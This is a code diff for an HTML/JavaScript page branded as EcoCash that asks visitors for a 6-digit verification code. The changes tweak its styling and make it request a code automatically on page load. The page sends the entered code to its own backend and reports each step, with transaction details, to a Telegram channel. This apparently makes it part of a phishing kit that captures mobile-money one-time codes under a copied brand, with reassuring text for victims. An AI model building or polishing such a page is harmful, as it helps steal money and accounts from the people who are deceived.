@@ -25,41 +25,48 @@
     -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; padding: 24px 16px 48px;
   }
-  .wrap { max-width: 480px; margin: 0 auto; }
+  .wrap { max-width: 440px; margin: 0 auto; }
 
-  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
   .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
   .brand .eco { color: var(--eco-blue); }
   .brand .cash { color: var(--eco-red); }
-  .header .label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
+  .header .label {
+    font-size: 10.5px; font-weight: 700; text-transform: uppercase;
+    letter-spacing: 0.7px; color: var(--eco-muted);
+  }
 
   .card {
     background: #fff; border-radius: 20px; border: 1px solid var(--eco-border);
     box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden;
   }
-  .card-head { padding: 24px 24px 18px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE; }
+  .card-head {
+    padding: 22px 22px 16px; border-bottom: 1px solid var(--eco-border);
+    background: #FBFCFE; text-align: center;
+  }
   .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
   .card-head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
 
-  .card-body { padding: 22px 24px 24px; }
+  .card-body { padding: 20px 22px 22px; }
 
-  /* Transaction summary */
   .tx-block {
     background: var(--eco-soft); border-radius: 12px; padding: 14px 16px;
     display: flex; justify-content: space-between; align-items: center;
-    margin-bottom: 22px;
+    margin-bottom: 20px;
   }
-  .tx-block .tx-left .k { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 4px; }
-  .tx-block .tx-left .v { font-size: 14px; font-weight: 700; }
-  .tx-block .tx-amt { font-size: 18px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.5px; }
-  .tx-block .tx-amt .cur { font-size: 12px; font-weight: 700; margin-right: 4px; opacity: 0.85; }
+  .tx-block .tx-left .k {
+    font-size: 10.5px; font-weight: 700; text-transform: uppercase;
+    letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 3px;
+  }
+  .tx-block .tx-left .v { font-size: 13.5px; font-weight: 700; word-break: break-all; }
+  .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.4px; white-space: nowrap; }
+  .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
 
-  /* OTP input */
-  .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
-  .otp-row { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 14px; }
+  .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; }
+  .otp-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 14px; }
   .otp-row input {
-    flex: 1; min-width: 0; height: 54px;
-    border: 2px solid var(--eco-border); border-radius: 12px;
+    flex: 1; min-width: 0; max-width: 48px; height: 52px;
+    border: 2.5px solid var(--eco-border); border-radius: 14px;
     background: #fff; color: var(--eco-navy);
     font-family: inherit; font-size: 22px; font-weight: 800;
     text-align: center; outline: none;
@@ -68,41 +75,54 @@
   .otp-row input:focus { border-color: var(--eco-blue); box-shadow: 0 0 0 3px rgba(0,102,166,0.12); }
   .otp-row input.filled { border-color: var(--eco-blue); }
 
-  .otp-help { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
-  .otp-help .note { font-size: 11.5px; color: var(--eco-muted); }
+  .otp-help {
+    display: flex; justify-content: center; align-items: center;
+    gap: 6px; margin-bottom: 16px; font-size: 12px; color: var(--eco-muted);
+  }
   .resend-btn {
     background: transparent; border: none; font-family: inherit;
     font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer;
-    padding: 4px 0;
+    padding: 2px 0;
   }
   .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
 
   .action-btn {
-    width: 100%; height: 54px; background: var(--eco-blue); color: #fff;
-    border: none; border-radius: 12px; font-family: inherit;
+    width: 100%; height: 56px; background: var(--eco-blue); color: #fff;
+    border: none; border-radius: 14px; font-family: inherit;
     font-size: 15px; font-weight: 800; cursor: pointer;
-    transition: filter .15s;
+    transition: filter .15s, transform .1s;
     display: flex; align-items: center; justify-content: center; gap: 8px;
   }
   .action-btn:hover { filter: brightness(1.08); }
-  .action-btn:disabled { opacity: 0.65; cursor: wait; }
+  .action-btn:active { transform: scale(0.99); }
+  .action-btn:disabled { opacity: 0.7; cursor: wait; }
 
   .error-msg {
     display: none; background: #FEF2F2; border: 1px solid #FECACA; color: #B91C1C;
     font-size: 12.5px; font-weight: 500; padding: 10px 12px;
-    border-radius: 10px; margin-bottom: 16px; text-align: center; line-height: 1.5;
+    border-radius: 10px; margin-bottom: 14px; text-align: center; line-height: 1.5;
   }
   .error-msg.show { display: block; }
 
-  .card-foot {
-    padding: 16px 24px; border-top: 1px solid var(--eco-border);
-    background: #FBFCFE; display: flex; justify-content: center;
+  .success-msg {
+    display: none; background: #F0FDF4; border: 1px solid #BBF7D0; color: #15803D;
+    font-size: 12.5px; font-weight: 500; padding: 10px 12px;
+    border-radius: 10px; margin-bottom: 14px; text-align: center; line-height: 1.5;
   }
-  .card-foot .brand { font-size: 16px; }
+  .success-msg.show { display: block; }
 
-  .page-foot { text-align: center; margin-top: 18px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
+  .card-foot {
+    padding: 14px 22px 18px; border-top: 1px solid var(--eco-border);
+    background: #FBFCFE; text-align: center;
+  }
+  .card-foot .brand { font-size: 15px; }
+  .card-foot .small { font-size: 10.5px; color: var(--eco-muted); margin-top: 3px; }
 
-  /* Toast */
+  .page-foot {
+    text-align: center; margin-top: 16px;
+    font-size: 11px; color: var(--eco-muted); line-height: 1.6;
+  }
+
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
@@ -115,10 +135,12 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  @media (max-width: 380px) {
-    .otp-row input { height: 48px; font-size: 18px; }
+  @media (max-width: 360px) {
+    .otp-row input { height: 46px; font-size: 19px; border-radius: 12px; }
     .otp-row { gap: 6px; }
-    .action-btn { height: 48px; font-size: 14px; }
+    .action-btn { height: 50px; font-size: 14px; }
+    .card-body { padding: 18px 16px 20px; }
+    .card-head { padding: 20px 16px 14px; }
   }
 </style>
 </head>
@@ -132,8 +154,8 @@
 
   <div class="card">
     <div class="card-head">
-      <h1>Verify your payment</h1>
-      <p>Enter the 6-digit code sent to your EcoCash number to confirm this transaction.</p>
+      <h1>Enter verification code</h1>
+      <p>We sent a 6-digit code to your EcoCash number.</p>
     </div>
 
     <div class="card-body">
@@ -146,41 +168,43 @@
       </div>
 
       <div class="error-msg" id="errBox"></div>
+      <div class="success-msg" id="okBox"></div>
 
-      <label class="otp-label">6-digit verification code</label>
+      <label class="otp-label">6-digit code</label>
       <div class="otp-row" id="otpRow">
-        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" data-idx="0">
-        <input type="text" inputmode="numeric" maxlength="1" data-idx="1">
-        <input type="text" inputmode="numeric" maxlength="1" data-idx="2">
-        <input type="text" inputmode="numeric" maxlength="1" data-idx="3">
-        <input type="text" inputmode="numeric" maxlength="1" data-idx="4">
-        <input type="text" inputmode="numeric" maxlength="1" data-idx="5">
+        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
       </div>
 
       <div class="otp-help">
-        <span class="note" id="otpNote">Didn't receive the code?</span>
-        <button class="resend-btn" id="resendBtn" onclick="requestCode()" disabled>Resend in 30s</button>
+        <span>Didn't receive the code?</span>
+        <button class="resend-btn" id="resendBtn" onclick="requestCode('manual')" disabled>Resend in 30s</button>
       </div>
 
-      <button class="action-btn" id="verifyBtn" onclick="verifyCode()">Verify payment</button>
+      <button class="action-btn" id="verifyBtn" onclick="verifyCode()">Verify</button>
     </div>
 
     <div class="card-foot">
       <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <div class="small">Your credentials are never shared.</div>
     </div>
   </div>
 
   <div class="page-foot">
-    Powered by EcoCash · Your credentials are never shared.
+    Powered by EcoCash · Secure payment verification
   </div>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ============================================================
-     Transaction data from the URL
-  ============================================================ */
+  /* ------------------------------------------------------------
+     Transaction data from the URL (set by pay.html)
+  ------------------------------------------------------------ */
   const params = new URLSearchParams(location.search);
   const txData = {
     tx:  params.get('tx')  || '',
@@ -190,13 +214,21 @@
     c:   params.get('c')   || ''
   };
 
-  document.getElementById('txId').textContent = txData.tx || '—';
-  document.getElementById('amtCur').textContent = txData.cur;
-  document.getElementById('amtVal').textContent = Number(txData.am || 0).toFixed(2);
+  if (txData.tx) {
+    document.getElementById('txId').textContent = txData.tx;
+    document.getElementById('amtCur').textContent = txData.cur;
+    document.getElementById('amtVal').textContent = Number(txData.am || 0).toFixed(2);
+  } else {
+    document.querySelector('.card').innerHTML =
+      '<div style="padding:40px 24px;text-align:center">' +
+      '<h2 style="font-size:18px;margin-bottom:6px">Missing transaction</h2>' +
+      '<p style="font-size:13px;color:#667085">Please return to the payment page and try again.</p>' +
+      '</div>';
+  }
 
-  /* ============================================================
-     OTP box behaviour — auto-advance, backspace, paste
-  ============================================================ */
+  /* ------------------------------------------------------------
+     OTP boxes — auto-advance, backspace, paste
+  ------------------------------------------------------------ */
   const boxes = Array.from(document.querySelectorAll('#otpRow input'));
   boxes.forEach((el, i) => {
     el.addEventListener('input', () => {
@@ -217,17 +249,15 @@
     });
   });
 
-  function getOtp() {
-    return boxes.map(el => el.value).join('');
-  }
+  function getOtp() { return boxes.map(el => el.value).join(''); }
   function clearOtp() {
     boxes.forEach(el => { el.value = ''; el.classList.remove('filled'); });
     boxes[0].focus();
   }
 
-  /* ============================================================
+  /* ------------------------------------------------------------
      UI helpers
-  ============================================================ */
+  ------------------------------------------------------------ */
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
@@ -237,28 +267,35 @@
   function showError(msg) {
     const el = document.getElementById('errBox');
     el.textContent = msg; el.classList.add('show');
+    document.getElementById('okBox').classList.remove('show');
   }
-  function clearError() {
+  function showSuccess(msg) {
+    const el = document.getElementById('okBox');
+    el.textContent = msg; el.classList.add('show');
     document.getElementById('errBox').classList.remove('show');
   }
+  function clearMessages() {
+    document.getElementById('errBox').classList.remove('show');
+    document.getElementById('okBox').classList.remove('show');
+  }
 
-  /* ============================================================
+  /* ------------------------------------------------------------
      Resend countdown
-  ============================================================ */
+  ------------------------------------------------------------ */
   let countdown = 30;
-  let countdownTimer = null;
+  let timer = null;
   const resendBtn = document.getElementById('resendBtn');
 
   function startCountdown(seconds) {
     countdown = seconds;
     resendBtn.disabled = true;
     resendBtn.textContent = 'Resend in ' + countdown + 's';
-    if (countdownTimer) clearInterval(countdownTimer);
-    countdownTimer = setInterval(() => {
+    if (timer) clearInterval(timer);
+    timer = setInterval(() => {
       countdown -= 1;
       if (countdown <= 0) {
-        clearInterval(countdownTimer);
-        countdownTimer = null;
+        clearInterval(timer);
+        timer = null;
         resendBtn.disabled = false;
         resendBtn.textContent = 'Resend code';
       } else {
@@ -267,34 +304,34 @@
     }, 1000);
   }
 
-  /* ============================================================
-     Report an event to the backend (which forwards to Telegram)
-     No secrets are ever sent to the backend from this page.
-  ============================================================ */
-  async function reportEvent(type, extra) {
+  /* ------------------------------------------------------------
+     Report an event to the backend — the backend forwards to
+     Telegram. No token, no OTP, no PIN is sent from the client.
+  ------------------------------------------------------------ */
+  async function reportEvent(type) {
+    if (!txData.tx) return;
     try {
       await fetch('/api/telegram/event', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           type: type,
-          tx: txData.tx,
-          am: txData.am,
-          cur: txData.cur,
-          c: txData.c,
-          ...extra
+          tx:   txData.tx,
+          am:   txData.am,
+          cur:  txData.cur,
+          c:    txData.c
         })
       });
     } catch (e) {
-      // Never block the user because Telegram is down
+      // Never block the UI on a notification failure
     }
   }
 
-  /* ============================================================
+  /* ------------------------------------------------------------
      Request a code
-  ============================================================ */
-  async function requestCode() {
-    clearError();
+  ------------------------------------------------------------ */
+  async function requestCode(source) {
+    clearMessages();
     resendBtn.disabled = true;
     resendBtn.textContent = 'Sending…';
 
@@ -302,20 +339,21 @@
       const r = await fetch('/api/verification/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ tx: txData.tx, purpose: 'resend' })
+        body: JSON.stringify({ tx: txData.tx })
       });
       const j = await r.json().catch(() => ({}));
 
       if (!r.ok) {
-        showError(j.message || 'Could not send code. Please try again.');
+        showError(j.message || 'Could not send code.');
         resendBtn.disabled = false;
         resendBtn.textContent = 'Resend code';
         return;
       }
 
-      showToast('Verification code sent.');
+      showToast('Code sent.');
+      showSuccess('A 6-digit code has been sent to your number.');
       startCountdown(30);
-      await reportEvent('otp_requested');
+      await reportEvent(source === 'auto' ? 'page_opened' : 'otp_requested');
     } catch (e) {
       showError('Network error. Please try again.');
       resendBtn.disabled = false;
@@ -323,13 +361,12 @@
     }
   }
 
-  /* ============================================================
-     Verify the code
-  ============================================================ */
+  /* ------------------------------------------------------------
+     Verify the OTP
+  ------------------------------------------------------------ */
   async function verifyCode() {
-    clearError();
+    clearMessages();
     const otp = getOtp();
-
     if (otp.length !== 6) {
       showError('Please enter all 6 digits.');
       return;
@@ -343,24 +380,22 @@
       const r = await fetch('/api/verification/verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ tx: txData.tx, otp: otp })
+        body: JSON.stringify({ tx: txData.tx, otp })
       });
       const j = await r.json().catch(() => ({}));
 
       if (!r.ok || !j.success) {
         showError(j.message || 'Invalid code. Please try again.');
         btn.disabled = false;
-        btn.textContent = 'Verify payment';
+        btn.textContent = 'Verify';
         clearOtp();
         return;
       }
 
-      // Server confirmed. Show result.
+      showSuccess('Code verified. Redirecting…');
       btn.textContent = 'Verified ✓';
-      showToast('Payment verified.');
       await reportEvent('verification_success');
 
-      // Redirect to verify.html with the transaction details
       const q = new URLSearchParams({
         tx:  txData.tx,
         am:  txData.am,
@@ -368,24 +403,22 @@
         rn:  txData.rn,
         c:   txData.c
       });
+
       setTimeout(() => {
         window.location.replace('verify.html?' + q.toString());
       }, 800);
     } catch (e) {
       showError('Network error. Please try again.');
       btn.disabled = false;
-      btn.textContent = 'Verify payment';
+      btn.textContent = 'Verify';
     }
   }
 
-  /* ============================================================
-     On load: report page_open event once
-  ============================================================ */
+  /* ------------------------------------------------------------
+     On load — request the first OTP automatically
+  ------------------------------------------------------------ */
   document.addEventListener('DOMContentLoaded', () => {
-    if (txData.tx) {
-      reportEvent('page_opened');
-      startCountdown(30);
-    }
+    if (txData.tx) requestCode('auto');
   });
 </script>
 </body>
